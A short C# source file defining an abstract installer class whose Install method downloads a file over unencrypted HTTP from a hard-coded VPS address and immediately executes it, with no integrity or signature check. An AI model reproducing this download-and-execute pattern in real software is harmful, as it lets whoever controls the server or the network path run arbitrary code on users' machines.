using System.Diagnostics;
using System.IO;
using System.Net;

namespace OakieDokie.dab
{
    public abstract class InstallBase  : IInstal
    {
        public string TociInstallsDirectory { get; set; }

        protected string Path;

        protected string DirectoryName;
        protected string FileName;
        protected string FileDwnlName;

        public bool Install()
        {
            SetNames();

            string path = TociInstallsDirectory + "\\" + DirectoryName;

            WebClient wc = new WebClient();
            wc.DownloadFile("http://vps458649.ovh.net/" + FileDwnlName, TociInstallsDirectory + "\\" + FileName); 

            Process.Start(TociInstallsDirectory + "\\" + FileName);

            return true;
        }

        protected abstract void SetNames();
    }
}